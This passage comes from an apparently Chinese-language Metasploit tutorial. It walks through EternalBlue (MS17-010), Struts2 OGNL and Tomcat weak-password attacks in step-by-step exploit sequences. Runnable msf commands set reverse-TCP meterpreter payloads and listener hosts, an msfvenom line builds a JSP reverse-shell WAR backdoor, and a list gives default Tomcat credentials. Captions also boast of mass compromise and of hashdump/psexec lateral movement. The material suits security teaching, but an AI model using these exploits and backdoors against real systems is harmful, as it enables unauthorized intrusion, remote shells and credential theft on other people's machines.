YaHei,Arial">2-&gt;3</text>  <rect x="380" y="190" width="160" height="110" rx="12" fill="#0f172a" stroke="#a855f7" stroke-width="2.2"/>  <text x="460" y="216" text-anchor="middle" font-size="13" font-weight="800" fill="#a855f7" font-family="Microsoft YaHei,Arial">③ use 漏洞模块</text>  <line x1="390" y1="232" x2="530" y2="232" stroke="#334155"/>  <text x="460" y="252" text-anchor="middle" font-size="9.5" fill="#e2e8f0" font-family="Consolas,Monospace">use exploit/windows/smb/ms17_0</text>  <text x="460" y="268" text-anchor="middle" font-size="9.5" fill="#e2e8f0" font-family="Consolas,Monospace">10_eternalblue</text>  <text x="460" y="284" text-anchor="middle" font-size="9.5" fill="#e2e8f0" font-family="Consolas,Monospace"></text>  <path d="M540,245 L550,245" stroke="#60a5fa" stroke-width="2.3" fill="none" marker-end="url(#s01a)"/>  <text x="545.0" y="240.0" text-anchor="middle" font-size="11" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">3-&gt;4</text>  <rect x="550" y="190" width="160" height="110" rx="12" fill="#0f172a" stroke="#f59e0b" stroke-width="2.2"/>  <text x="630" y="216" text-anchor="middle" font-size="13" font-weight="800" fill="#f59e0b" font-family="Microsoft YaHei,Arial">④ set 参数</text>  <line x1="560" y1="232" x2="700" y2="232" stroke="#334155"/>  <text x="630" y="252" text-anchor="middle" font-size="9.5" fill="#e2e8f0" font-family="Consolas,Monospace">set RHOSTS x.x.x.x ; set LHOST</text>  <text x="630" y="268" text-anchor="middle" font-size="9.5" fill="#e2e8f0" font-family="Consolas,Monospace"> y ; set payload ...</text>  <text x="630" y="284" text-anchor="middle" font-size="9.5" fill="#e2e8f0" font-family="Consolas,Monospace"></text>  <path d="M710,245 L720,245" stroke="#60a5fa" stroke-width="2.3" fill="none" marker-end="url(#s01a)"/>  <text x="715.0" y="240.0" text-anchor="middle" font-size="11" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">4-&gt;5</text>  <rect x="720" y="190" width="160" height="110" rx="12" fill="#0f172a" stroke="#ef4444" stroke-width="2.2"/>  <text x="800" y="216" text-anchor="middle" font-size="13" font-weight="800" fill="#ef4444" font-family="Microsoft YaHei,Arial">⑤ exploit -j</text>  <line x1="730" y1="232" x2="870" y2="232" stroke="#334155"/>  <text x="800" y="252" text-anchor="middle" font-size="9.5" fill="#e2e8f0" font-family="Consolas,Monospace">EternalBlue 打 -&gt; meterpreter s</text>  <text x="800" y="268" text-anchor="middle" font-size="9.5" fill="#e2e8f0" font-family="Consolas,Monospace">ession 1 open</text>  <text x="800" y="284" text-anchor="middle" font-size="9.5" fill="#e2e8f0" font-family="Consolas,Monospace"></text>  <path d="M880,245 L890,245" stroke="#60a5fa" stroke-width="2.3" fill="none" marker-end="url(#s01a)"/>  <text x="885.0" y="240.0" text-anchor="middle" font-size="11" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">5-&gt;6</text>  <rect x="890" y="190" width="160" height="110" rx="12" fill="#0f172a" stroke="#10b981" stroke-width="2.2"/>  <text x="970" y="216" text-anchor="middle" font-size="13" font-weight="800" fill="#10b981" font-family="Microsoft YaHei,Arial">⑥ 后渗透</text>  <line x1="900" y1="232" x2="1040" y2="232" stroke="#334155"/>  <text x="970" y="252" text-anchor="middle" font-size="9.5" fill="#e2e8f0" font-family="Consolas,Monospace">hashdump + psexec 横向段内所有 Win7/</text>  <text x="970" y="268" text-anchor="middle" font-size="9.5" fill="#e2e8f0" font-family="Consolas,Monospace">2008</text>  <text x="970" y="284" text-anchor="middle" font-size="9.5" fill="#e2e8f0" font-family="Consolas,Monospace"></text>  <rect x="60" y="350" width="960" height="88" rx="10" fill="#020617" stroke="#ef4444"/>  <text x="80" y="375" font-size="13" fill="#fecaca" font-weight="700" font-family="Microsoft YaHei,Arial">⚠ MS17-010 关键坑点（90% 新手打不上都在这 5 点）</text>  <text x="80" y="394" font-size="10.5" fill="#fca5a5" font-family="Microsoft YaHei,Arial">· 1. 目标必须是 Win7 SP1/2008 R2 SP1；Win10+/2012+ 不适用（打了补丁的也不行）</text>  <text x="80" y="408" font-size="10.5" fill="#fca5a5" font-family="Microsoft YaHei,Arial">· 2. set ProcessName explorer.exe（默认 lsass 有时崩溃蓝屏；蓝屏=换 TARGET 1/2/3）</text>  <text x="80" y="422" font-size="10.5" fill="#fca5a5" font-family="Microsoft YaHei,Arial">· 3. 架构严格 64 对 64 / 32 对 32；set payload windows/x64/meterpreter/reverse_tcp</text>  <text x="80" y="436" font-size="10.5" fill="#fca5a5" font-family="Microsoft YaHei,Arial">· 4. 目标防火墙没拦 445入站，且 SMBv1 没禁用（Windows 2019 默认已关）</text>  <text x="80" y="450" font-size="10.5" fill="#fca5a5" font-family="Microsoft YaHei,Arial">· 5. 先 run check 显示 The target is vulnerable 再 exploit，不然大概率蓝屏</text>  <text x="540.0" y="475" text-anchor="middle" font-size="12" fill="#64748b" font-family="Microsoft YaHei,Arial">永恒之蓝是内网神器，Win7 段 1 小时拿下 200 台是常规操作</text>
</svg>


### Armitage 简介

Armitage是Metasploit的图形化界面，提供：
- 可视化操作
- 团队协作
- 自动化攻击

**启动Armitage：**
```bash
armitage
```

### Armitage 界面

Armitage主界面分为三个区域：

| 区域 | 功能 |
|------|------|
| 目标区域 | 显示发现的目标 |
| 模块区域 | 显示可用模块 |
| 控制区域 | 显示会话和命令 |

### 使用 Armitage 扫描

1. 点击"Hosts" → "Nmap Scan" → "Intense Scan"
2. 输入目标IP范围
3. 扫描完成后，目标以图标显示

### 使用 Armitage 攻击

1. 右键点击目标图标
2. 选择"Attack"
3. 选择合适的漏洞利用模块
4. 配置参数后执行

---

## 3.12 实战案例：MS17-010永恒之蓝


<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1080 660" width="100%" style="max-width:1080px;margin:12px auto;display:block;background:#05091a;border-radius:14px;border:1px solid #1e3a8a">
  <defs>
    <linearGradient id="s18g" x1="0" x2="1" y1="0" y2="1"><stop offset="0%" stop-color="#1e293b"/><stop offset="100%" stop-color="#0f172a"/></linearGradient>
    <linearGradient id="s18b" x1="0" x2="1"><stop offset="0" stop-color="#6366f1"/><stop offset="1" stop-color="#06b6d4"/></linearGradient>
    <linearGradient id="s18r" x1="0" x2="1"><stop offset="0" stop-color="#ef4444"/><stop offset="1" stop-color="#f97316"/></linearGradient>
    <marker id="s18a" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="6" markerHeight="6" orient="auto"><path d="M0,0 L10,5 L0,10 z" fill="#60a5fa"/></marker>
    <filter id="s18s" x="-20%" y="-20%" width="140%" height="140%"><feDropShadow dx="0" dy="3" stdDeviation="4" flood-color="#000" flood-opacity="0.45"/></filter>
  </defs>
  <rect x="0" y="0" width="1080" height="520" fill="url(#s18g)"/>
  <text x="540.0" y="44" text-anchor="middle" font-size="22" font-weight="700" fill="#e2e8f0" font-family="Microsoft YaHei,Arial">图 3-18 Struts2 S2-045/057/062 漏洞实战链路</text>  <text x="540.0" y="74" text-anchor="middle" font-size="13" fill="#94a3b8" font-family="Microsoft YaHei,Arial">HTTP Content-Type / OGNL 注入 RCE，内网 Java Web 最常见漏洞之一</text>  <rect x="80" y="190" width="160" height="110" rx="12" fill="#0f172a" stroke="#0ea5e9" stroke-width="2.2"/>  <text x="160" y="216" text-anchor="middle" font-size="13" font-weight="800" fill="#0ea5e9" font-family="Microsoft YaHei,Arial">① 端口/指纹</text>  <line x1="90" y1="232" x2="230" y2="232" stroke="#334155"/>  <text x="160" y="252" text-anchor="middle" font-size="9.5" fill="#e2e8f0" font-family="Consolas,Monospace">whatweb / nmap -sV :8080/str</text>  <text x="160" y="268" text-anchor="middle" font-size="9.5" fill="#e2e8f0" font-family="Consolas,Monospace">uts2</text>  <text x="160" y="284" text-anchor="middle" font-size="9.5" fill="#e2e8f0" font-family="Consolas,Monospace"></text>  <path d="M240,245 L240,385" stroke="#60a5fa" stroke-width="2.3" fill="none" marker-end="url(#s01a)" stroke-dasharray="3 3"/>  <rect x="250" y="330" width="160" height="110" rx="12" fill="#0f172a" stroke="#8b5cf6" stroke-width="2.2"/>  <text x="330" y="356" text-anchor="middle" font-size="13" font-weight="800" fill="#8b5cf6" font-family="Microsoft YaHei,Arial">② 脚本探测</text>  <line x1="260" y1="372" x2="400" y2="372" stroke="#334155"/>  <text x="330" y="392" text-anchor="middle" font-size="9.5" fill="#e2e8f0" font-family="Consolas,Monospace">use auxiliary/scanner/http/s</text>  <text x="330" y="408" text-anchor="middle" font-size="9.5" fill="#e2e8f0" font-family="Consolas,Monospace">truts2_scanner</text>  <text x="330" y="424" text-anchor="middle" font-size="9.5" fill="#e2e8f0" font-family="Consolas,Monospace"></text>  <path d="M410,385 L410,245" stroke="#60a5fa" stroke-width="2.3" fill="none" marker-end="url(#s01a)" stroke-dasharray="3 3"/>  <rect x="420" y="190" width="160" height="110" rx="12" fill="#0f172a" stroke="#a855f7" stroke-width="2.2"/>  <text x="500" y="216" text-anchor="middle" font-size="13" font-weight="800" fill="#a855f7" font-family="Microsoft YaHei,Arial">③ 选 exploit</text>  <line x1="430" y1="232" x2="570" y2="232" stroke="#334155"/>  <text x="500" y="252" text-anchor="middle" font-size="9.5" fill="#e2e8f0" font-family="Consolas,Monospace">use exploit/multi/http/strut</text>  <text x="500" y="268" text-anchor="middle" font-size="9.5" fill="#e2e8f0" font-family="Consolas,Monospace">s2_content_type_ognl (S2-045</text>  <text x="500" y="284" text-anchor="middle" font-size="9.5" fill="#e2e8f0" font-family="Consolas,Monospace">)</text>  <path d="M580,245 L580,385" stroke="#60a5fa" stroke-width="2.3" fill="none" marker-end="url(#s01a)" stroke-dasharray="3 3"/>  <rect x="590" y="330" width="160" height="110" rx="12" fill="#0f172a" stroke="#f59e0b" stroke-width="2.2"/>  <text x="670" y="356" text-anchor="middle" font-size="13" font-weight="800" fill="#f59e0b" font-family="Microsoft YaHei,Arial">④ set 参数</text>  <line x1="600" y1="372" x2="740" y2="372" stroke="#334155"/>  <text x="670" y="392" text-anchor="middle" font-size="9.5" fill="#e2e8f0" font-family="Consolas,Monospace">set RHOSTS x ; set RPORT 808</text>  <text x="670" y="408" text-anchor="middle" font-size="9.5" fill="#e2e8f0" font-family="Consolas,Monospace">0 ; set TARGETURI /xxx.actio</text>  <text x="670" y="424" text-anchor="middle" font-size="9.5" fill="#e2e8f0" font-family="Consolas,Monospace">n ; set payload linux/x64/...</text>  <path d="M750,385 L750,245" stroke="#60a5fa" stroke-width="2.3" fill="none" marker-end="url(#s01a)" stroke-dasharray="3 3"/>  <rect x="760" y="190" width="160" height="110" rx="12" fill="#0f172a" stroke="#ef4444" stroke-width="2.2"/>  <text x="840" y="216" text-anchor="middle" font-size="13" font-weight="800" fill="#ef4444" font-family="Microsoft YaHei,Arial">⑤ exploit -&gt; shell</text>  <line x1="770" y1="232" x2="910" y2="232" stroke="#334155"/>  <text x="840" y="252" text-anchor="middle" font-size="9.5" fill="#e2e8f0" font-family="Consolas,Monospace">check -&gt; exploit 拿到 java 权限 </text>  <text x="840" y="268" text-anchor="middle" font-size="9.5" fill="#e2e8f0" font-family="Consolas,Monospace">shell / meterpreter</text>  <text x="840" y="284" text-anchor="middle" font-size="9.5" fill="#e2e8f0" font-family="Consolas,Monospace"></text>  <path d="M920,245 L920,385" stroke="#60a5fa" stroke-width="2.3" fill="none" marker-end="url(#s01a)" stroke-dasharray="3 3"/>  <rect x="930" y="330" width="160" height="110" rx="12" fill="#0f172a" stroke="#10b981" stroke-width="2.2"/>  <text x="1010" y="356" text-anchor="middle" font-size="13" font-weight="800" fill="#10b981" font-family="Microsoft YaHei,Arial">⑥ 提权到 root</text>  <line x1="940" y1="372" x2="1080" y2="372" stroke="#334155"/>  <text x="1010" y="392" text-anchor="middle" font-size="9.5" fill="#e2e8f0" font-family="Consolas,Monospace">find suid + CVE-2021-xxxx po</text>  <text x="1010" y="408" text-anchor="middle" font-size="9.5" fill="#e2e8f0" font-family="Consolas,Monospace">lkit 提权</text>  <text x="1010" y="424" text-anchor="middle" font-size="9.5" fill="#e2e8f0" font-family="Consolas,Monospace"></text>  <rect x="60" y="465" width="960" height="32" rx="8" fill="#1e293b" stroke="#8b5cf6"/>  <text x="540" y="485" text-anchor="middle" font-size="13" font-weight="700" fill="#bfdbfe" font-family="Microsoft YaHei,Arial">Struts2 常用 5 个 exploit 模块速查（按 CVE 年份从新到旧）</text>  <rect x="60" y="502" width="240" height="26" fill="#1e293b" stroke="#6366f1"/>  <rect x="310" y="502" width="420" height="26" fill="#1e293b" stroke="#6366f1"/>  <rect x="740" y="502" width="280" height="26" fill="#1e293b" stroke="#6366f1"/>  <rect x="60" y="528" width="240" height="26" fill="#111c35" stroke="#334155"/>  <rect x="310" y="528" width="420" height="26" fill="#111c35" stroke="#334155"/>  <rect x="740" y="528" width="280" height="26" fill="#111c35" stroke="#334155"/>  <text x="68" y="546" font-size="10.5" font-weight="700" fill="#ef4444" font-family="Microsoft YaHei,Arial">S2-062 (CVE-2021-31805)</text>  <text x="318" y="546" font-size="10" fill="#fde68a" font-family="Consolas,Monospace">exploit/multi/http/struts2_ognl_injection</text>  <text x="748" y="546" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">6.2.0.3 - 2.5.25 + 后缀 .action</text>  <rect x="60" y="554" width="240" height="26" fill="#0b1530" stroke="#334155"/>  <rect x="310" y="554" width="420" height="26" fill="#0b1530" stroke="#334155"/>  <rect x="740" y="554" width="280" height="26" fill="#0b1530" stroke="#334155"/>  <text x="68" y="572" font-size="10.5" font-weight="700" fill="#f59e0b" font-family="Microsoft YaHei,Arial">S2-057 (CVE-2018-11776)</text>  <text x="318" y="572" font-size="10" fill="#fde68a" font-family="Consolas,Monospace">exploit/multi/http/struts2_namespace_ognl</text>  <text x="748" y="572" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">2.3 -&gt; 2.3.34 ; 2.5 -&gt; 2.5.16</text>  <rect x="60" y="580" width="240" height="26" fill="#111c35" stroke="#334155"/>  <rect x="310" y="580" width="420" height="26" fill="#111c35" stroke="#334155"/>  <rect x="740" y="580" width="280" height="26" fill="#111c35" stroke="#334155"/>  <text x="68" y="598" font-size="10.5" font-weight="700" fill="#8b5cf6" font-family="Microsoft YaHei,Arial">S2-045 (CVE-2017-5638)</text>  <text x="318" y="598" font-size="10" fill="#fde68a" font-family="Consolas,Monospace">exploit/multi/http/struts2_content_type_ognl</text>  <text x="748" y="598" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">2.3.5 - 2.3.31 ; 2.5 - 2.5.10  最常用</text>  <rect x="60" y="606" width="240" height="26" fill="#0b1530" stroke="#334155"/>  <rect x="310" y="606" width="420" height="26" fill="#0b1530" stroke="#334155"/>  <rect x="740" y="606" width="280" height="26" fill="#0b1530" stroke="#334155"/>  <text x="68" y="624" font-size="10.5" font-weight="700" fill="#a855f7" font-family="Microsoft YaHei,Arial">S2-048 (CVE-2017-9791)</text>  <text x="318" y="624" font-size="10" fill="#fde68a" font-family="Consolas,Monospace">exploit/multi/http/struts2_rest_xstream</text>  <text x="748" y="624" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">Struts 2.5.x REST 插件开启才中</text>  <rect x="60" y="632" width="240" height="26" fill="#111c35" stroke="#334155"/>  <rect x="310" y="632" width="420" height="26" fill="#111c35" stroke="#334155"/>  <rect x="740" y="632" width="280" height="26" fill="#111c35" stroke="#334155"/>  <text x="68" y="650" font-size="10.5" font-weight="700" fill="#0ea5e9" font-family="Microsoft YaHei,Arial">S2-032 (CVE-2016-3081)</text>  <text x="318" y="650" font-size="10" fill="#fde68a" font-family="Consolas,Monospace">exploit/multi/http/struts2_dmi</text>  <text x="748" y="650" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">Dynamic Method Invocation 开启</text>
</svg>


### 漏洞简介

MS17-010（永恒之蓝）是2017年披露的严重漏洞：
- 影响Windows系统SMB服务
- 可远程执行代码
- 不需要认证
- 影响范围广

**影响系统：**
- Windows 7
- Windows 8.1
- Windows 10
- Windows Server 2008/2012/2016

### 检测漏洞

**使用Nmap检测：**
```bash
nmap --script smb-vuln-ms17-010 -p445 192.168.1.1
```

**使用Metasploit检测：**
```msf
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 192.168.1.1
run
```

### 利用漏洞

```msf
# 选择模块
use exploit/windows/smb/ms17_010_eternalblue

# 查看信息
show info

# 设置参数
set RHOSTS 192.168.1.1
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444

# 执行
run
```

**成功后：**
```
[*] Sending stage (200262 bytes) to 192.168.1.1
[*] Meterpreter session 1 opened

meterpreter > sysinfo
Computer        : TARGET-PC
OS              : Windows 7
Architecture    : x64
```

---

## 3.13 实战案例：Apache Struts2漏洞


<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1080 560" width="100%" style="max-width:1080px;margin:12px auto;display:block;background:#05091a;border-radius:14px;border:1px solid #1e3a8a">
  <defs>
    <linearGradient id="s19g" x1="0" x2="1" y1="0" y2="1"><stop offset="0%" stop-color="#1e293b"/><stop offset="100%" stop-color="#0f172a"/></linearGradient>
    <linearGradient id="s19b" x1="0" x2="1"><stop offset="0" stop-color="#6366f1"/><stop offset="1" stop-color="#06b6d4"/></linearGradient>
    <linearGradient id="s19r" x1="0" x2="1"><stop offset="0" stop-color="#ef4444"/><stop offset="1" stop-color="#f97316"/></linearGradient>
    <marker id="s19a" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="6" markerHeight="6" orient="auto"><path d="M0,0 L10,5 L0,10 z" fill="#60a5fa"/></marker>
    <filter id="s19s" x="-20%" y="-20%" width="140%" height="140%"><feDropShadow dx="0" dy="3" stdDeviation="4" flood-color="#000" flood-opacity="0.45"/></filter>
  </defs>
  <rect x="0" y="0" width="1080" height="520" fill="url(#s19g)"/>
  <text x="540.0" y="44" text-anchor="middle" font-size="22" font-weight="700" fill="#e2e8f0" font-family="Microsoft YaHei,Arial">图 3-19 Tomcat 弱口令 + WAR 上传后门实战 6 步</text>  <text x="540.0" y="74" text-anchor="middle" font-size="13" fill="#94a3b8" font-family="Microsoft YaHei,Arial">经典组合拳：manager/html 弱口令 -&gt; 上传 WAR -&gt; GET /backdoor/shell.jsp</text>  <rect x="40" y="180" width="160" height="120" rx="12" fill="#0f172a" stroke="#0ea5e9" stroke-width="2.2"/>  <text x="120" y="206" text-anchor="middle" font-size="13" font-weight="800" fill="#0ea5e9" font-family="Microsoft YaHei,Arial">① 8080 指纹</text>  <line x1="50" y1="222" x2="190" y2="222" stroke="#334155"/>  <text x="120" y="242" text-anchor="middle" font-size="9.5" fill="#e2e8f0" font-family="Consolas,Monospace">whatweb / dirsearch 扫到 manag</text>  <text x="120" y="258" text-anchor="middle" font-size="9.5" fill="#e2e8f0" font-family="Consolas,Monospace">er/html</text>  <path d="M200,240 L210,240" stroke="#60a5fa" stroke-width="2.3" fill="none" marker-end="url(#s01a)"/>  <text x="205.0" y="235.0" text-anchor="middle" font-size="11" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">1-&gt;2</text>  <rect x="210" y="180" width="160" height="120" rx="12" fill="#0f172a" stroke="#8b5cf6" stroke-width="2.2"/>  <text x="290" y="206" text-anchor="middle" font-size="13" font-weight="800" fill="#8b5cf6" font-family="Microsoft YaHei,Arial">② 口令爆破</text>  <line x1="220" y1="222" x2="360" y2="222" stroke="#334155"/>  <text x="290" y="242" text-anchor="middle" font-size="9.5" fill="#e2e8f0" font-family="Consolas,Monospace">use auxiliary/scanner/http/t</text>  <text x="290" y="258" text-anchor="middle" font-size="9.5" fill="#e2e8f0" font-family="Consolas,Monospace">omcat_mgr_login</text>  <path d="M370,240 L380,240" stroke="#60a5fa" stroke-width="2.3" fill="none" marker-end="url(#s01a)"/>  <text x="375.0" y="235.0" text-anchor="middle" font-size="11" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">2-&gt;3</text>  <rect x="380" y="180" width="160" height="120" rx="12" fill="#0f172a" stroke="#a855f7" stroke-width="2.2"/>  <text x="460" y="206" text-anchor="middle" font-size="13" font-weight="800" fill="#a855f7" font-family="Microsoft YaHei,Arial">③ 拿到账密</text>  <line x1="390" y1="222" x2="530" y2="222" stroke="#334155"/>  <text x="460" y="242" text-anchor="middle" font-size="9.5" fill="#e2e8f0" font-family="Consolas,Monospace">admin:tomcat / manager:manag</text>  <text x="460" y="258" text-anchor="middle" font-size="9.5" fill="#e2e8f0" font-family="Consolas,Monospace">er / tomcat:s3cret</text>  <path d="M540,240 L550,240" stroke="#60a5fa" stroke-width="2.3" fill="none" marker-end="url(#s01a)"/>  <text x="545.0" y="235.0" text-anchor="middle" font-size="11" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">3-&gt;4</text>  <rect x="550" y="180" width="160" height="120" rx="12" fill="#0f172a" stroke="#f59e0b" stroke-width="2.2"/>  <text x="630" y="206" text-anchor="middle" font-size="13" font-weight="800" fill="#f59e0b" font-family="Microsoft YaHei,Arial">④ 生成 WAR 后门</text>  <line x1="560" y1="222" x2="700" y2="222" stroke="#334155"/>  <text x="630" y="242" text-anchor="middle" font-size="9.5" fill="#e2e8f0" font-family="Consolas,Monospace">msfvenom -p java/jsp_shell_r</text>  <text x="630" y="258" text-anchor="middle" font-size="9.5" fill="#e2e8f0" font-family="Consolas,Monospace">everse_tcp LHOST=... -f war </text>  <text x="630" y="274" text-anchor="middle" font-size="9.5" fill="#e2e8f0" font-family="Consolas,Monospace">-o backdoor.war</text>  <path d="M710,240 L720,240" stroke="#60a5fa" stroke-width="2.3" fill="none" marker-end="url(#s01a)"/>  <text x="715.0" y="235.0" text-anchor="middle" font-size="11" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">4-&gt;5</text>  <rect x="720" y="180" width="160" height="120" rx="12" fill="#0f172a" stroke="#ef4444" stroke-width="2.2"/>  <text x="800" y="206" text-anchor="middle" font-size="13" font-weight="800" fill="#ef4444" font-family="Microsoft YaHei,Arial">⑤ 登录上传 WAR</text>  <line x1="730" y1="222" x2="870" y2="222" stroke="#334155"/>  <text x="800" y="242" text-anchor="middle" font-size="9.5" fill="#e2e8f0" font-family="Consolas,Monospace">浏览器 Manager App -&gt; Deploy -&gt;</text>  <text x="800" y="258" text-anchor="middle" font-size="9.5" fill="#e2e8f0" font-family="Consolas,Monospace"> Upload WAR</text>  <path d="M880,240 L890,240" stroke="#60a5fa" stroke-width="2.3" fill="none" marker-end="url(#s01a)"/>  <text x="885.0" y="235.0" text-anchor="middle" font-size="11" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">5-&gt;6</text>  <rect x="890" y="180" width="160" height="120" rx="12" fill="#0f172a" stroke="#10b981" stroke-width="2.2"/>  <text x="970" y="206" text-anchor="middle" font-size="13" font-weight="800" fill="#10b981" font-family="Microsoft YaHei,Arial">⑥ 访问后门拿 Shell</text>  <line x1="900" y1="222" x2="1040" y2="222" stroke="#334155"/>  <text x="970" y="242" text-anchor="middle" font-size="9.5" fill="#e2e8f0" font-family="Consolas,Monospace">GET /backdoor/shell.jsp -&gt; h</text>  <text x="970" y="258" text-anchor="middle" font-size="9.5" fill="#e2e8f0" font-family="Consolas,Monospace">andler 得 session</text>  <rect x="60" y="350" width="960" height="28" rx="8" fill="#1e293b" stroke="#a855f7"/>  <text x="540" y="368" text-anchor="middle" font-size="13" font-weight="700" fill="#bfdbfe" font-family="Microsoft YaHei,Arial">Tomcat 默认弱口令 Top 10（内置 tomcat_mgr_login 字典就是这些）</text>  <rect x="60" y="386" width="184" height="30" rx="6" fill="#0b1530" stroke="#334155"/>  <text x="152" y="406" text-anchor="middle" font-size="10.5" fill="#fde68a" font-family="Consolas,Monospace">tomcat / tomcat</text>  <rect x="252" y="386" width="184" height="30" rx="6" fill="#0b1530" stroke="#334155"/>  <text x="344" y="406" text-anchor="middle" font-size="10.5" fill="#fde68a" font-family="Consolas,Monospace">admin / admin</text>  <rect x="444" y="386" width="184" height="30" rx="6" fill="#0b1530" stroke="#334155"/>  <text x="536" y="406" text-anchor="middle" font-size="10.5" fill="#fde68a" font-family="Consolas,Monospace">tomcat / s3cret</text>  <rect x="636" y="386" width="184" height="30" rx="6" fill="#0b1530" stroke="#334155"/>  <text x="728" y="406" text-anchor="middle" font-size="10.5" fill="#fde68a" font-family="Consolas,Monospace">manager / manager</text>  <rect x="828" y="386" width="184" height="30" rx="6" fill="#0b1530" stroke="#334155"/>  <text x="920" y="406" text-anchor="middle" font-size="10.5" fill="#fde68a" font-family="Consolas,Monospace">admin / (空)</text>  <rect x="60" y="420" width="184" height="30" rx="6" fill="#0b1530" stroke="#334155"/>  <text x="152" y="440" text-anchor="middle" font-size="10.5" fill="#fde68a" font-family="Consolas,Monospace">tomcat / password</text>  <rect x="252" y="420" width="184" height="30" rx="6" fill="#0b1530" stroke="#334155"/>  <text x="344" y="440" text-anchor="middle" font-size="10.5" fill="#fde68a" font-family="Consolas,Monospace">role1 / role1</text>  <rect x="444" y="420" width="184" height="30" rx="6" fill="#0b1530" stroke="#334155"/>  <text x="536" y="440" text-anchor="middle" font-size="10.5" fill="#fde68a" font-family="Consolas,Monospace">both / both</text>  <rect x="636" y="420" width="184" height="30" rx="6" fill="#0b1530" stroke="#334155"/>  <text x="728" y="440" text-anchor="middle" font-size="10.5" fill="#fde68a" font-family="Consolas,Monospace">tomcat / admin</text>  <rect x="828" y="420" width="184" height="30" rx="6" fill="#0b1530" stroke="#334155"/>  <text x="920" y="440" text-anchor="middle" font-size="10.5" fill="#fde68a" font-family="Consolas,Monospace">root / root</text>  <rect x="60" y="464" width="960" height="36" rx="8" fill="#020617" stroke="#f59e0b"/>  <text x="80" y="486" font-size="12" fill="#fde68a" font-weight="700" font-family="Microsoft YaHei,Arial">💡 进阶：Tomcat 7 以后开启 CSRF，需手动抓 Manager Cookie / 用 use exploit/multi/http/tomcat_mgr_upload 模块一步到位</text>  <text x="540.0" y="520" text-anchor="middle" font-size="12" fill="#64748b" font-family="Microsoft YaHei,Arial">Tomcat 是 Java 项目最常用容器，弱口令 + WAR 上传=内网打点命中率 30%+</text>
</svg>


### 漏洞简介

Apache Struts2是流行的Java Web框架，存在多个严重漏洞：
- S2-045（CVE-2017-5638）
- S2-046
- S2-057
- S2-062

### 利用Struts2漏洞

```msf
# 搜索Struts漏洞
search struts2

# 选择模块
use exploit/multi/http/struts2_content_type_ognl

# 设置参数
set RHOSTS target.example.com
set RPORT 8080
set PAYLOAD java/jsp_shell_reverse_tcp
set LHOST 192.168.1.100

# 执行
run
```

---

## 3.14 实战案例：Tomcat弱口令


<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1080 540" width="100%" style="max-width:1080px;margin:12px auto;display:block;background:#05091a;border-radius:14px;border:1px solid #1e3a8a">
  <defs>
    <linearGradient id="s20g" x1="0" x2="1" y1="0" y2="1"><stop offset="0%" stop-color="#1e293b"/><stop offset="100%" stop-color="#0f172a"/></linearGradient>
    <linearGradient id="s20b" x1="0" x2="1"><stop offset="0" stop-color="#6366f1"/><stop offset="1" stop-color="#06b6d4"/></linearGradient>
    <linearGradient id="s20r" x1="0" x2="1"><stop offset="0" stop-color="#ef4444"/><stop offset="1" stop-color="#f97316"/></linearGradient>
    <marker id="s20a" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="6" markerHeight="6" orient="auto"><path d="M0,0 L10,5 L0,10 z" fill="#60a5fa"/></marker>
    <filter id="s20s" x="-20%" y="-20%" width="140%" height="140%"><feDropShadow dx="0" dy="3" stdDeviation="4" flood-color="#000" flood-opacity="0.45"/></filter>
  </defs>
  <rect x="0" y="0" width="1080" height="520" fill="url(#s20g)"/>
  <text x="540.0" y="44" text-anchor="middle" font-size="22" font-weight="700" fill="#e2e8f0" font-family="Microsoft YaHei,Arial">图 3-20 Post 后渗透 Top 12 模块速查表（拿 Shell 后直接跑）</text>  <text x="540.0" y="74" text-anchor="middle" font-size="13" fill="#94a3b8" font-family="Microsoft YaHei,Arial">按用途分 4 大类：信息收集 / 提权 / 凭证 / 横向</text>  <rect x="60" y="110" width="120" height="30" fill="#1e293b" stroke="#6366f1"/>  <text x="120.0" y="130" text-anchor="middle" fill="#bfdbfe" font-size="12.5" font-weight="700" font-family="Microsoft YaHei,Arial">用途分类</text>  <rect x="190" y="110" width="420" height="30" fill="#1e293b" stroke="#6366f1"/>  <text x="400.0" y="130" text-anchor="middle" fill="#bfdbfe" font-size="12.5" font-weight="700" font-family="Microsoft YaHei,Arial">完整模块路径（直接复制 use）</text>  <rect x="620" y="110" width="400" height="30" fill="#1e293b" stroke="#6366f1"/>  <text x="820.0" y="130" text-anchor="middle" fill="#bfdbfe" font-size="12.5" font-weight="700" font-family="Microsoft YaHei,Arial">作用一句话说明</text>  <rect x="60" y="140" width="120" height="30" fill="#111c35" stroke="#334155"/>  <rect x="190" y="140" width="420" height="30" fill="#111c35" stroke="#334155"/>  <rect x="620" y="140" width="400" height="30" fill="#111c35" stroke="#334155"/>  <text x="120.0" y="160" text-anchor="middle" fill="#0ea5e9" font-size="10.5" font-weight="700" font-family="Microsoft YaHei,Arial">信息收集</text>  <text x="198" y="160" font-size="10" fill="#fde68a" font-family="Consolas,Monospace">post/windows/gather/checkvm</text>  <text x="628" y="160" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">判断是不是虚拟机（VM/KVM/XEN）</text>  <rect x="60" y="170" width="120" height="30" fill="#0b1530" stroke="#334155"/>  <rect x="190" y="170" width="420" height="30" fill="#0b1530" stroke="#334155"/>  <rect x="620" y="170" width="400" height="30" fill="#0b1530" stroke="#334155"/>  <text x="120.0" y="190" text-anchor="middle" 